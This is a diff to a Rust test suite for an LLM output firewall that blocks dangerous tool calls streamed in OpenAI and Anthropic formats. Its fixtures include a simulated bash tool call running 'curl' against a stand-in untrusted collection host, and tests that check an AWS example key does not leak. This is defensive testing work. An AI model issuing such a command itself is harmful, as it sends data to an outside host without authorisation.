@@ -76,6 +76,57 @@ fn anthropic_tool_call_stream() -> String {
     )
 }
 
+const ASK_HEAD: &str = r#"{\"command\":\"curl https://untrusted"#;
+const ASK_TAIL: &str = r#"-api.example.com/collect\"}"#;
+
+fn openai_ask_tool_call_stream() -> String {
+    format!(
+        concat!(
+            r#"data: {{"choices":[{{"index":0,"delta":{{"role":"assistant","tool_calls":"#,
+            r#"[{{"index":0,"id":"c1","type":"function","function":{{"name":"bash","arguments":""}}}}]}}}}]}}"#,
+            "\n\n",
+            r#"data: {{"choices":[{{"index":0,"delta":{{"tool_calls":"#,
+            r#"[{{"index":0,"function":{{"arguments":"{head}"}}}}]}}}}]}}"#,
+            "\n\n",
+            r#"data: {{"choices":[{{"index":0,"delta":{{"tool_calls":"#,
+            r#"[{{"index":0,"function":{{"arguments":"{tail}"}}}}]}}}}]}}"#,
+            "\n\n",
+            r#"data: {{"choices":[{{"index":0,"delta":{{}},"finish_reason":"tool_calls"}}]}}"#,
+            "\n\n",
+            "data: [DONE]\n\n"
+        ),
+        head = ASK_HEAD,
+        tail = ASK_TAIL
+    )
+}
+
+fn anthropic_ask_tool_call_stream() -> String {
+    format!(
+        concat!(
+            "event: content_block_start\n",
+            r#"data: {{"type":"content_block_start","index":0,"content_block":"#,
+            r#"{{"type":"tool_use","id":"toolu_1","name":"bash","input":{{}}}}}}"#,
+            "\n\n",
+            "event: content_block_delta\n",
+            r#"data: {{"type":"content_block_delta","index":0,"delta":"#,
+            r#"{{"type":"input_json_delta","partial_json":"{head}"}}}}"#,
+            "\n\n",
+            "event: content_block_delta\n",
+            r#"data: {{"type":"content_block_delta","index":0,"delta":"#,
+            r#"{{"type":"input_json_delta","partial_json":"{tail}"}}}}"#,
+            "\n\n",
+            "event: content_block_stop\n",
+            r#"data: {{"type":"content_block_stop","index":0}}"#,
+            "\n\n",
+            "event: message_stop\n",
+            r#"data: {{"type":"message_stop"}}"#,
+            "\n\n"
+        ),
+        head = ASK_HEAD,
+        tail = ASK_TAIL
+    )
+}
+
 /// A harmless call in the same wire shape: proves the gate does not block everything.
 fn openai_benign_stream() -> String {
     concat!(
@@ -183,6 +234,10 @@ async fn openai_stream_blocks_a_tool_call_split_across_frames() {
         !body.contains("finish_reason"),
         "the completing frame must never reach the client: {body}"
     );
+    assert!(
+        !body.contains("AKIAIOSFODNN7EXAMPLE"),
+        "withheld tool chunks must not leak to client on block: {body}"
+    );
 }
 
 #[tokio::test]
@@ -202,6 +257,10 @@ async fn anthropic_stream_blocks_a_tool_use_split_across_frames() {
     assert!(
         !body.contains("message_stop"),
         "the completing frame must never reach the client: {body}"
+    );
+    assert!(
+        !body.contains("AKIAIOSFODNN7EXAMPLE"),
+        "withheld tool chunks must not leak to client on block: {body}"
     );
 }
 
@@ -242,19 +301,30 @@ async fn disabled_inspection_forwards_the_stream_verbatim() {
     );
 }
 
-/// A frame that is not JSON is not a tool call the provider's own client could
-/// execute either, so tool inspection must not turn it into a refusal. Failing
-/// closed here would deny legitimate traffic for no security gain; the size limit
-/// is the condition that genuinely hides an executable call, and it is covered by
-/// the decoder's own unit test.
+/// In shadow mode or when tool inspection is not enforcing, non-JSON frames
+/// pass through untouched.
 #[tokio::test]
-async fn a_non_json_frame_does_not_block_the_stream() {
-    let non_json = "data: hello
+async fn a_non_json_frame_does_not_block_the_stream_when_not_enforcing() {
+    let non_json = "data: hello\n\ndata: world\n\n".to_string();
+    let server = upstream("/v1/chat/completions", non_json.clone()).await;
+    let body = stream_body(
+        state(server.uri(), true, false),
+        "/v1/chat/completions",
+        openai_request(),
+    )
+    .await;
 
-data: world
+    assert_eq!(
+        body, non_json,
+        "undecodable frames must pass through when not enforcing, not refuse the stream"
+    );
+}
 
-"
-    .to_string();
+/// In enforcing mode with fail_closed, malformed non-JSON data cannot be inspected
+/// for protected tool calls and must be refused fail-closed.
+#[tokio::test]
+async fn a_malformed_json_frame_in_enforcing_fail_closed_mode_blocks_the_stream() {
+    let non_json = "data: hello\n\ndata: world\n\n".to_string();
     let server = upstream("/v1/chat/completions", non_json.clone()).await;
     let body = stream_body(
         state(server.uri(), true, true),
@@ -263,9 +333,9 @@ data: world
     )
     .await;
 
-    assert_eq!(
-        body, non_json,
-        "undecodable frames must pass through, not refuse the stream"
+    assert!(
+        body.contains("llm_firewall_block"),
+        "malformed frame in enforcing fail-closed mode must be blocked, got: {body}"
     );
 }
 
@@ -283,5 +353,262 @@ async fn a_benign_split_tool_call_is_not_blocked() {
         body,
         openai_benign_stream(),
         "a harmless reassembled call must pass through untouched"
+    );
+}
+
+#[tokio::test]
+async fn openai_stream_blocks_an_ask_tool_call_split_across_frames() {
+    let server = upstream("/v1/chat/completions", openai_ask_tool_call_stream()).await;
+    let body = stream_body(
+        state(server.uri(), true, true),
+        "/v1/chat/completions",
+        openai_request(),
+    )
+    .await;
+
+    assert!(
+        body.contains("llm_firewall_block"),
+        "reassembled unknown-host ask call must be blocked, got: {body}"
+    );
+    assert!(
+        !body.contains("finish_reason"),
+        "the completing frame must never reach the client: {body}"
+    );
+}
+
+#[tokio::test]
+async fn anthropic_stream_blocks_an_ask_tool_use_split_across_frames() {
+    let server = upstream("/v1/messages", anthropic_ask_tool_call_stream()).await;
+    let body = stream_body(
+        state(server.uri(), true, true),
+        "/v1/messages",
+        anthropic_request(),
+    )
+    .await;
+
+    assert!(
+        body.contains("blocked by Soup Wall output policy"),
+        "reassembled unknown-host ask tool_use must be blocked, got: {body}"
+    );
+    assert!(
+        !body.contains("message_stop"),
+        "the completing frame must never reach the client: {body}"
+    );
+}
+
+fn openai_truncated_tool_call_stream() -> String {
+    format!(
+        concat!(
+            r#"data: {{"choices":[{{"index":0,"delta":{{"role":"assistant","tool_calls":"#,
+            r#"[{{"index":0,"id":"c1","type":"function","function":{{"name":"bash","arguments":""}}}}]}}}}]}}"#,
+            "\n\n",
+            r#"data: {{"choices":[{{"index":0,"delta":{{"tool_calls":"#,
+            r#"[{{"index":0,"function":{{"arguments":"{head}"}}}}]}}}}]}}"#,
+            "\n\n",
+            r#"data: {{"choices":[{{"index":0,"delta":{{"tool_calls":"#,
+            r#"[{{"index":0,"function":{{"arguments":"{tail}"}}}}]}}}}]}}"#,
+            "\n\n"
+        ),
+        head = SECRET_HEAD,
+        tail = SECRET_TAIL
+    )
+}
+
+#[tokio::test]
+async fn openai_stream_truncation_without_terminal_frame_withholds_and_blocks() {
+    let server = upstream("/v1/chat/completions", openai_truncated_tool_call_stream()).await;
+    let body = stream_body(
+        state(server.uri(), true, true),
+        "/v1/chat/completions",
+        openai_request(),
+    )
+    .await;
+
+    assert!(
+        body.contains("llm_firewall_block"),
+        "truncated stream with pending tool call must emit block frame: {body}"
+    );
+    assert!(
+        !body.contains("AKIAIOSFODNN7EXAMPLE"),
+        "unconfirmed tool call material must not leak on truncation: {body}"
+    );
+    assert!(
+        !body.contains("bash"),
+        "tool call name must not leak on truncation: {body}"
+    );
+}
+
+fn anthropic_truncated_tool_call_stream() -> String {
+    format!(
+        concat!(
+            "event: content_block_start\n",
+            r#"data: {{"type":"content_block_start","index":0,"content_block":"#,
+            r#"{{"type":"tool_use","id":"toolu_1","name":"bash","input":{{}}}}}}"#,
+            "\n\n",
+            "event: content_block_delta\n",
+            r#"data: {{"type":"content_block_delta","index":0,"delta":"#,
+            r#"{{"type":"input_json_delta","partial_json":"{head}"}}}}"#,
+            "\n\n",
+            "event: content_block_delta\n",
+            r#"data: {{"type":"content_block_delta","index":0,"delta":"#,
+            r#"{{"type":"input_json_delta","partial_json":"{tail}"}}}}"#,
+            "\n\n"
+        ),
+        head = SECRET_HEAD,
+        tail = SECRET_TAIL
+    )
+}
+
+#[tokio::test]
+async fn anthropic_stream_truncation_without_terminal_frame_withholds_and_blocks() {
+    let server = upstream("/v1/messages", anthropic_truncated_tool_call_stream()).await;
+    let body = stream_body(
+        state(server.uri(), true, true),
+        "/v1/messages",
+        anthropic_request(),
+    )
+    .await;
+
+    assert!(
+        body.contains("blocked by Soup Wall output policy"),
+        "truncated Anthropic stream with pending tool_use must emit block frame: {body}"
+    );
+    assert!(
+        !body.contains("AKIAIOSFODNN7EXAMPLE"),
+        "unconfirmed tool_use material must not leak on truncation: {body}"
+    );
+    assert!(
+        !body.contains("bash"),
+        "tool_use name must not leak on truncation: {body}"
+    );
+}
+
+/// Regression for REVIEW104_UNFRAMED_WITNESS: an unparsed SSE frame missing its
+/// final blank-line delimiter must not be forwarded byte-for-byte; at stream EOF
+/// it must be refused fail-closed.
+#[tokio::test]
+async fn openai_stream_without_frame_delimiter_at_eof_is_withheld_and_blocks() {
+    let unclosed_payload = concat!(
+        r#"data: {"choices":[{"index":0,"delta":{"role":"assistant","tool_calls":"#,
+        r#"[{"index":0,"id":"c1","type":"function","function":{"name":"write_marker","arguments":"{}"}}]}}]}"#
+    );
+    let server = upstream("/v1/chat/completions", unclosed_payload.to_string()).await;
+    let body = stream_body(
+        state(server.uri(), true, true),
+        "/v1/chat/completions",
+        openai_request(),
+    )
+    .await;
+
+    assert!(
+        body.contains("llm_firewall_block"),
+        "unframed tool call at EOF must emit block frame: {body}"
+    );
+    assert!(
+        !body.contains("write_marker"),
+        "unframed tool call name must not leak to client: {body}"
+    );
+    assert!(
+        !body.contains("tool_calls"),
+        "unframed tool call delta must not leak to client: {body}"
+    );
+}
+
+#[tokio::test]
+async fn anthropic_stream_without_frame_delimiter_at_eof_is_withheld_and_blocks() {
+    let unclosed_payload = concat!(
+        "event: content_block_start\n",
+        r#"data: {"type":"content_block_start","index":0,"content_block":{"type":"tool_use","id":"toolu_1","name":"write_marker","input":{}}}"#
+    );
+    let server = upstream("/v1/messages", unclosed_payload.to_string()).await;
+    let body = stream_body(
+        state(server.uri(), true, true),
+        "/v1/messages",
+        anthropic_request(),
+    )
+    .await;
+
+    assert!(
+        body.contains("blocked by Soup Wall output policy"),
+        "unframed Anthropic tool_use at EOF must emit block frame: {body}"
+    );
+    assert!(
+        !body.contains("write_marker"),
+        "unframed Anthropic tool_use name must not leak to client: {body}"
+    );
+}
+
+async fn chunked_upstream(chunks: Vec<String>) -> (String, tokio::task::JoinHandle<()>) {
+    let listener = tokio::net::TcpListener::bind(("127.0.0.1", 0))
+        .await
+        .unwrap();
+    let addr = listener.local_addr().unwrap();
+    let handle = tokio::spawn(async move {
+        if let Ok((mut socket, _)) = listener.accept().await {
+            use tokio::io::{AsyncReadExt, AsyncWriteExt};
+            let mut buf = [0u8; 4096];
+            let _ = socket.read(&mut buf).await;
+            let header = "HTTP/1.1 200 OK\r\nContent-Type: text/event-stream\r\nTransfer-Encoding: chunked\r\n\r\n";
+            let _ = socket.write_all(header.as_bytes()).await;
+            for chunk in chunks {
+                let chunk_hdr = format!("{:X}\r\n", chunk.len());
+                let _ = socket.write_all(chunk_hdr.as_bytes()).await;
+                let _ = socket.write_all(chunk.as_bytes()).await;
+                let _ = socket.write_all(b"\r\n").await;
+                let _ = socket.flush().await;
+                tokio::time::sleep(std::time::Duration::from_millis(2)).await;
+            }
+            let _ = socket.write_all(b"0\r\n\r\n").await;
+            let _ = socket.flush().await;
+        }
+    });
+    (format!("http://{addr}"), handle)
+}
+
+#[tokio::test]
+async fn openai_stream_transport_fragmentation_allows_benign_tool_call() {
+    let benign = openai_benign_stream();
+    let chunks: Vec<String> = benign
+        .as_bytes()
+        .chunks(7)
+        .map(|c| String::from_utf8_lossy(c).into_owned())
+        .collect();
+    let (base_url, _handle) = chunked_upstream(chunks).await;
+    let body = stream_body(
+        state(base_url, true, true),
+        "/v1/chat/completions",
+        openai_request(),
+    )
+    .await;
+
+    assert_eq!(
+        body, benign,
+        "arbitrary transport fragmentation of benign call must pass through untouched"
+    );
+}
+
+#[tokio::test]
+async fn openai_stream_transport_fragmentation_blocks_ask_tool_call() {
+    let ask_stream = openai_ask_tool_call_stream();
+    let chunks: Vec<String> = ask_stream
+        .as_bytes()
+        .chunks(11)
+        .map(|c| String::from_utf8_lossy(c).into_owned())
+        .collect();
+    let (base_url, _handle) = chunked_upstream(chunks).await;
+    let body = stream_body(
+        state(base_url, true, true),
+        "/v1/chat/completions",
+        openai_request(),
+    )
+    .await;
+
+    assert!(
+        body.contains("llm_firewall_block"),
+        "fragmented Ask tool call must be blocked: {body}"
+    );
+    assert!(
+        !body.contains("untrusted-api.example.com"),
+        "fragmented Ask tool call arguments must not leak: {body}"
     );
 }
